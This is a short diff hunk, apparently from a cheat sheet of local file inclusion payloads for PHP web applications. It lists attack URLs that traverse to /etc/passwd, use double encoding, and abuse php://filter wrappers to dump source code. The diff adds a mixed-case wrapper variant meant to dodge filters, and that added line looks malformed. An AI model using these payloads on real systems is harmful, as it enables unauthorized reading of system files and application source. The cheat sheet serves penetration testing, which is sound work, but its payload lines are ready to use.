@@ -11,10 +11,11 @@ http://example.com/index.php?page=../../etc/passwd
 http://example.com/index.php?page=%252e%252e%252f
 ```
 
-LFI Wrapper rot13 and base64
+LFI Wrapper rot13 and base64 - php://filter case insensitive
 ```
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=php=pHp://FilTer/convert.base64-encode/resource=index.php
 ```
 
 LFI Wrapper zip
